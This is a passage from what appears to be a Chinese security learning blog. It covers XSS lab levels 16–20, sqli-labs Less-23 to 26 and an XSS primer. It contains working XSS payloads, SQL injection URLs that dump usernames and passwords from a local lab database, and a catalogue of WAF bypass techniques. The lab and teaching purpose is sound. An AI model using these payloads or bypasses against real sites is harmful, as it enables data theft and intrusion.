class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27;</span><br></pre></td></tr></table></figure><h1 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level17.php?arg01=a&amp;arg02=b&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line">&lt;center&gt;test&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:4&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>关键字<code>script</code>以及<code>/</code>和<code>空格</code>都被编码成同样的空格字符实体了。</li><li>尝试加个a标签，空格用回车编码代替，点击图片过关</li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a%0D%0Aonclick=&#x27;alert(1)&#x27;&gt;</span><br></pre></td></tr></table></figure><h1 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h1><h2 id="这一关中间是一个flash-插件，没法正常显示出来"><a href="#这一关中间是一个flash-插件，没法正常显示出来" class="headerlink" title="这一关中间是一个flash 插件，没法正常显示出来"></a>这一关中间是一个flash 插件，没法正常显示出来</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line">&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><code>embed src=url</code>说明：embed可以用来插入各种媒体，格式可以是 Midi、Wav、AIFF、AU、MP3等等，</li></ul><hr><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h1 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h1><ul><li>这一关和上一关一样的，只是把flash 换成了图片而已，构造的语句都一样</li></ul><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=a&amp;arg02= onmouseover=alert(1)</span><br></pre></td></tr></table></figure><h1 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h1><h2 id="主要是因为现在-flash-技术全面停止使用-后面两关无法展示-感兴趣请自行搜索"><a href="#主要是因为现在-flash-技术全面停止使用-后面两关无法展示-感兴趣请自行搜索" class="headerlink" title="主要是因为现在 flash 技术全面停止使用,后面两关无法展示,感兴趣请自行搜索"></a>主要是因为现在 flash 技术全面停止使用,后面两关无法展示,感兴趣请自行搜索</h2><p>别人的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version&amp;arg02=&lt;a href=&#x27;javascript:alert(/xss/)&#x27;&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure><h1 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h1><h2 id="主要是因为现在-flash-技术全面停止使用-后面两关无法展示-感兴趣请自行搜索-1"><a href="#主要是因为现在-flash-技术全面停止使用-后面两关无法展示-感兴趣请自行搜索-1" class="headerlink" title="主要是因为现在 flash 技术全面停止使用,后面两关无法展示,感兴趣请自行搜索"></a>主要是因为现在 flash 技术全面停止使用,后面两关无法展示,感兴趣请自行搜索</h2><p>别人的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg01=id&amp;arg02=\&quot;))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs靶场 23-26</title>
      <link href="/archives/fb99ab33.html"/>
      <url>/archives/fb99ab33.html</url>
      
        <content type="html"><![CDATA[<p>参考crow: <a href="https://github.com/crow821/crowsec">https://github.com/crow821/crowsec</a></p><h1 id="Less-23"><a href="#Less-23" class="headerlink" title="Less-23"></a>Less-23</h1><ul><li>源码中对于 <code>--+</code> <code>#</code> 进行了过滤处理， 所以这里我们只能使用and 或者or语句进行闭合,在这里可以使用另外一种特殊的注释符<code>;%00</code>通过这个注释符可以判断列数</li><li>除了在url末尾将–+、# <code>--+</code> <code>#</code>替换为 <code>;%00</code>   其余的均和less01关相同。<h2 id="第二种报错注入"><a href="#第二种报错注入" class="headerlink" title="第二种报错注入"></a>第二种报错注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-23/?id=1&#x27; and updatexml(1,concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1 报错出数据库</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-23/?id=1&#x27; and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 2,1)),1) or &#x27;1&#x27;=&#x27;1 查询所有的数据库，使用limit进行逐个查询。</span><br></pre></td></tr></table></figure></li><li>后续更换语句即可</li></ul><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><ul><li>二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</li><li>二次注入，可以概括为以下两步:<blockquote><p>第一步：插入恶意数据: 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据: 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p></blockquote></li></ul><h1 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h1><ol><li>本关中由于对数据库长度做了限制，所以本次只演示替换密码：</li><li>首先我们查询目前的users表信息，找到admin的密码</li><li>我们用admin’# 注册一个账号，再登录</li><li>我们修改admin的密码<br>SQL语句：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27;</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27;</span><br><span class="line">UPDATE users SET PASSWORD=&#x27;123456&#x27; where username=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure></li></ol><h1 id="sql注入WAF绕过"><a href="#sql注入WAF绕过" class="headerlink" title="sql注入WAF绕过"></a>sql注入WAF绕过</h1><p>Waf绕过可大致分为三类：  </p><h2 id="白盒绕过"><a href="#白盒绕过" class="headerlink" title="白盒绕过"></a>白盒绕过</h2><ul><li>通过源代码分析，来进行绕过<h2 id="黑盒绕过"><a href="#黑盒绕过" class="headerlink" title="黑盒绕过"></a>黑盒绕过</h2><h3 id="架构层面绕过waf"><a href="#架构层面绕过waf" class="headerlink" title="架构层面绕过waf"></a>架构层面绕过waf</h3></li></ul><ol><li>寻找源网站绕过waf检测<br>主要针对的是云waf，找到源网站的真实地址，进行绕过，有点像CDN</li><li>通过同网段绕过waf防护<br>在一个网段中，可能经过的数据不会经过云waf，从而实现绕过。<h3 id="资源限制角度绕过waf"><a href="#资源限制角度绕过waf" class="headerlink" title="资源限制角度绕过waf"></a>资源限制角度绕过waf</h3></li></ol><ul><li>一般waf的执行需要优先考虑业务优先的原则，所以对于构造较大、超大数据包可能不会进行检测，从而实现绕过waf。<h3 id="协议层面绕过waf"><a href="#协议层面绕过waf" class="headerlink" title="协议层面绕过waf"></a>协议层面绕过waf</h3></li></ul><ol><li>协议未覆盖绕过waf<br>比如由于业务需要，只对get型进行检测，post数据选择忽略          </li><li>参数污染<br>index?id&#x3D;1&amp;id&#x3D;2  waf可能只对id&#x3D;1进行检测                                   <h3 id="规则层面的绕过waf"><a href="#规则层面的绕过waf" class="headerlink" title="规则层面的绕过waf"></a>规则层面的绕过waf</h3><h4 id="sql注释符绕过"><a href="#sql注释符绕过" class="headerlink" title="sql注释符绕过"></a>sql注释符绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union /**/select                               我们将union select之间的空格使用注释符进行替换（适用于对union select之间的空格进行检测的情况）</span><br><span class="line">union/*crow%0%32#*/select                                                           我们在注释符中间填充内容</span><br><span class="line">union/*aaaaaaaaaabbbbbbbbbcccccccccccdddddddddddeeeeeeeeeeee%%%%%%%%%*/select             构造较大数据</span><br><span class="line">/*!union select*/内联注释                                                          我们使用内联注释，mysql特有</span><br></pre></td></tr></table></figure></li></ol><ul><li>以上均采用select 1;进行测试成功</li></ul><h4 id="空白符绕过"><a href="#空白符绕过" class="headerlink" title="空白符绕过"></a>空白符绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql空白符：%09；%0A;  %0B;  %0D;  %20;  %0C;  %A0;  /*XXX*/</span><br><span class="line">正则空白符： %09；%0A;  %0B;  %0D;  %20; </span><br><span class="line">%25其实就是百分号  %25A0  就是空白符      </span><br></pre></td></tr></table></figure><h4 id="函数分割符号"><a href="#函数分割符号" class="headerlink" title="函数分割符号"></a>函数分割符号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">将一个函数进行分割concat()</span><br><span class="line"> %25其实就是百分号  %25A0  就是空白符      </span><br><span class="line">concat%2520(</span><br><span class="line">concat/**/(</span><br><span class="line">concat%250c(</span><br><span class="line">concat%25a0(</span><br></pre></td></tr></table></figure><h4 id="浮点数词法解释"><a href="#浮点数词法解释" class="headerlink" title="浮点数词法解释"></a>浮点数词法解释</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waf对于id=1可以进行检测，但是对于id=1E0、id=1.0、id=\N可能就无法检测</span><br></pre></td></tr></table></figure><h4 id="利用error-based进行sql注入"><a href="#利用error-based进行sql注入" class="headerlink" title="利用error-based进行sql注入"></a>利用error-based进行sql注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(1, concat(0x5c,md5(3)));</span><br><span class="line">updatexml(1, concat(0x5d,md5(3)),1);</span><br><span class="line">GeometryCollection((select*from(select*from(select@@version)f)x))</span><br><span class="line">polygon((select*from(select name_const(version(),1))x))</span><br><span class="line">linestring()</span><br><span class="line">multipoint()</span><br><span class="line">multilinestring()</span><br><span class="line">multipolygon()</span><br></pre></td></tr></table></figure><h4 id="mysql-特殊语法"><a href="#mysql-特殊语法" class="headerlink" title="mysql 特殊语法"></a>mysql 特殊语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#123;x schema_name&#125; from &#123;x information_schema.schemata&#125;;</span><br><span class="line">select &#123;x 1&#125;;</span><br></pre></td></tr></table></figure><h4 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h4><ul><li><p>可以使用burpsuite配合手工进行测试，后期测试成功后再用脚本进行处理。</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">如果对关键字and  or  union等进行了过滤，可以考虑使用大小写混合的方法</span><br><span class="line">Or   aNd UniOn</span><br><span class="line">但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法</span><br><span class="line">8. 关键字重复</span><br><span class="line">OORr  or</span><br><span class="line">9. 关键字替换</span><br><span class="line">如果还是无法绕过，可以考虑替换的方法</span><br><span class="line">and == &amp;&amp;    or == ||    like可以替换 =  &lt;&gt; 等价于 !=  </span><br></pre></td></tr></table></figure><h1 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h1></li><li><p>网页里，作者给出了一个提示，发现or被过滤了，我们尝试双写</p></li><li><p>双写的情况下，我们开始测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,3--+ 获得回显位置</span><br><span class="line">2. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,schema_name from information_schema.schemata --+ 根据提示我们可以到所有的or都被替换了，所以所有位置的or都需要写两次</span><br><span class="line">3. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata --+ 取出所有的库</span><br><span class="line">4. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x7365637572697479 --+ 取出所有的表</span><br><span class="line">5. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=0x7573657273--+ 取出所有的字段</span><br><span class="line">6. http://127.0.0.1/sqli/Less-25/?id=-1&#x27;  union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 取出字段中的值</span><br></pre></td></tr></table></figure></li><li><p>当我们使用<code>or</code> &#x3D;&gt; <code>||</code>的时候：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || 1=1--+ 判断存在注入</span><br><span class="line">2. http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || updatexml(1,concat(0x7e,(database()),0x7e),1)--+ 爆出当前数据库</span><br><span class="line">3. http://127.0.0.1/sqli/Less-25/?id=-1&#x27; || updatexml(1,concat(0x7e,(select schema_name from infoorrmation_schema.schemata limit 0,1),0x7e),1)--+ </span><br><span class="line">遍历爆出所有的数据，继续使用即可，这里不可以使用group_concat()，因为数据显示不完整</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/sqli/Less-25a/?id=1 页面显示正常</span><br><span class="line">2. http://127.0.0.1/sqli/Less-25a/?id=1&#x27; 此时页面发生显著变化，数据消失，说明存在注入，但是通过$sql语句得知，此处并没有将id值进行包裹</span><br><span class="line">3. http://127.0.0.1/sqli/Less-25a/?id=-1 union select 1,2,3--+ 可以使用联合查询，当我们使用联合查询注入时：</span><br><span class="line">4. http://127.0.0.1/sqli/Less-25a/?id=-1 union select 1,2,group_concat(schema_name) from infoorrmation_schema.schemata--+ 查到库</span><br><span class="line">5. http://127.0.0.1/sqli/Less-25a/?id=-1 union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=0x7573657273--+ 查到字段</span><br><span class="line">6. http://127.0.0.1/sqli/Less-25a/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+ 查到字段值</span><br></pre></td></tr></table></figure><h1 id="空格url编码替换"><a href="#空格url编码替换" class="headerlink" title="空格url编码替换"></a>空格url编码替换</h1><ul><li>绕开空格：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB键（水平）</span><br><span class="line">%0a 新建一行</span><br><span class="line">%0c 新的一页</span><br><span class="line">%0d return功能</span><br><span class="line">%0b TAB键（垂直）</span><br><span class="line">%a0 空格</span><br></pre></td></tr></table></figure></li></ul><h1 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h1><ul><li>当我们不考虑空格，使用报错注入的时候：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. http://127.0.0.1/Less-26/?id=1&#x27;  || updatexml(1, concat(0x7e, ( database()  ) ),1)  || &#x27;1&#x27;=&#x27;1 </span><br><span class="line">使用这种方式可以得到我们的当前数据库</span><br><span class="line">2. http://127.0.0.1/Less-26/?id=1&#x27;  || updatexml(1, concat(0x7e, (select  (group_concat(table_name)) from  (infoorrmation_schema.tables) where (table_schema = 0x7365637572697479)  ) ),1)  || &#x27;1&#x27;=&#x27;1  </span><br><span class="line">这样我们可以取得表信息。</span><br><span class="line">3.  http://127.0.0.1/Less-26/?id=1&#x27;  || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name = 0x7573657273)  ) ),1) || &#x27;1&#x27;=&#x27;1   </span><br><span class="line">通过这个我们取得字段的值</span><br><span class="line">4. http://127.0.0.1/Less-26/?id=1&#x27;  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  ) ),1) || &#x27;1&#x27;=&#x27;1 </span><br><span class="line">取出字段的值，但是取出的值很少，不完整。</span><br><span class="line">5. http://127.0.0.1/Less-26/?id=1&#x27;  || updatexml(1, concat(0x7e, ( select (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  where (id=2) ) )   ,1) || &#x27;1&#x27;=&#x27;1  </span><br><span class="line">通过改变id的值可以遍历所有的数据。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">以上的方法中，因为不能使用空格，所以采用报错注入的形式。我们如果使用字符进行替换呢？将空格替换为编码字符如何解决？  </span><br><span class="line"></span><br><span class="line">当我们使用%a0充当空格替换的时候：</span><br><span class="line">http://127.0.0.1/Less-26/?id=1&#x27; %a0%a0%a0%a0 oorrder %a0by%a0;%00</span><br><span class="line">这个时候我们直接将所有的空格进行替换即可，注释符可以使用;%00或者是使用  || &#x27;1&#x27;=&#x27;1即可完成注入</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS跨站脚本</title>
      <link href="/archives/eb18e635.html"/>
      <url>/archives/eb18e635.html</url>
      
        <content type="html"><![CDATA[<h1 id="XSS跨站脚本"><a href="#XSS跨站脚本" class="headerlink" title="XSS跨站脚本"></a>XSS跨站脚本</h1><ul><li>XSS是指攻击者在网页中嵌入客户端脚本，通常是JavaScript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。</li><li>XSS攻击是在网页中嵌入客户端恶意脚本代码，这些恶意代码一般是使用JavaScript语言编写的（也有使用ActionScript、.VBScript等客户端脚本语言编写的，但较为少见）。所以，如果想要深入研究XSS，必须要精通JavaScript。JavaScript能做到什么效果，XSS的威力就有多大。</li><li>JavaScript可以用来获取用户的Cookie、改变网页内容、URL调转，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者需要做的仅仅是向Web页面中注入JavaScript代码。</li></ul><h1 id="主要分为三种类型："><a href="#主要分为三种类型：" class="headerlink" title="主要分为三种类型："></a>主要分为三种类型：</h1><ul><li>反射型</li><li>存储型</li><li>DOM 型</li></ul><h1 id="XSS-危害"><a href="#XSS-危害" class="headerlink" title="XSS 危害"></a>XSS 危害</h1><ul><li>盗取 Cookie</li><li>盗取账户</li><li>恶意软件下载</li><li>键盘记录</li><li>钓鱼欺骗</li><li>XSS蠕虫</li><li>广告引流等等 JavaScript 能够写出的任意恶意功能</li></ul><h1 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h1><ul><li>反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。这个过程就像一次反射，故称为反射型XSS。</li><li>应用程序或 API 包括未经验证和未经转义的用户输入， 直接作为 HTML 输出的一部分。一个成功的攻击可以让攻击者在受害者的浏览器中执行任意的 HTML 和 JavaScript 。</li><li>特点：非持久化，必须用户点击带有特定参数的链接才能引起。影响范围：仅执行脚本的用户。<h2 id="跨站实例"><a href="#跨站实例" class="headerlink" title="跨站实例"></a>跨站实例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;xss test&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li>这段代码使用alert函数来执行打开一个消息框，消息框中显示xss信息使用xss弹出恶意警告框，代码为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li>xss输入也可能是html代码段，如果使网页不停的刷新，代码为<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;&quot;&gt;</span><br></pre></td></tr></table></figure></li><li>嵌入其他网站链接的代码为：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://xxxxx.com width=0 height=0&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h1 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h1></li><li>存储型xss比反射型跨站脚本更具威胁性，并且可能影响到web服务器的自身安全。</li><li>此类XSS不需要用户点击特定的URL就能执行跨站脚本，攻击者事先讲恶意JavaScript代码上传或存储到漏洞服务器中，只要受害者浏览包含此恶意的代码的页面就会执行恶意代码。</li><li>存储型 XSS 是指应用程序通过 Web 请求获取不可信赖的数据，在未检验数据是否存在 XSS 代码的情况下，便将其存入数据库。当下一次从数据库中获取该数据时程序也未对其进行过滤，页面再次执行 XSS 代码，存储型XSS 可以持续攻击用户。<h2 id="存储型-XSS-出现位置"><a href="#存储型-XSS-出现位置" class="headerlink" title="存储型 XSS 出现位置"></a>存储型 XSS 出现位置</h2></li><li>留言板</li><li>评论区</li><li>用户头像</li><li>个性签名</li><li>博客<h1 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h1></li><li>DOM 模型用一个逻辑树来表示一个文档，每个分支的终点都是一个节点 （node），每个节点都包含着对象（objects）。DOM 的方法（methods）让你可以用特定方式操作这个树，用这些方法你可以改变文档的结构、样式或者内容。</li><li>DOM 型 XSS 其实是一种特殊类型的反射型 XSS，通过 JS 操作 DOM 树动态地输出数据到页面，而不依赖于将数据提交给服务器端，它是基于 DOM 文档对象模型的一种漏洞。<h2 id="与反射型的异同点和危害"><a href="#与反射型的异同点和危害" class="headerlink" title="与反射型的异同点和危害"></a>与反射型的异同点和危害</h2></li></ul><ol><li>同：<br>都是没有控制好输入，并且把 javaScript 脚本 输入作为输出插入到HTML 页面。</li><li>异：<br>反射型 XSS 是经过后端语言后，页面引用后端输出生效。DOMXSS 是经过 JS 对 DOM 树直接操作后插入到页面。</li><li>危害性：<br>前后端分离，不经过 WAF 的检测。</li></ol><h1 id="手工挖掘XSS"><a href="#手工挖掘XSS" class="headerlink" title="手工挖掘XSS"></a>手工挖掘XSS</h1><ul><li>我们得到一个站点<a href="http://www.xxx.com/xss.php?id=1%E6%94%BB%E5%87%BB%E8%80%85%E4%BC%9A%E8%BF%99%E6%A0%B7%E8%BF%9B%E8%A1%8CXSS">http://www.xxx.com/xss.php?id=1攻击者会这样进行XSS</a> 测试，将如下payloads 分别添加到id&#x3D;1：可以测试用户输入地方、文件上传地方、flash等闭合标签<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=@ onerror=alert(1)/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&quot;&gt;&lt;img/src=@ onerror=alert(1)/&gt;</span><br></pre></td></tr></table></figure></li><li>在闭合标签的时候要注意闭合优先策略<h2 id="闭合优先的标签"><a href="#闭合优先的标签" class="headerlink" title="闭合优先的标签"></a>闭合优先的标签</h2>这些标签都是闭合优先级高于双引号完整性优先级的特殊标签。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 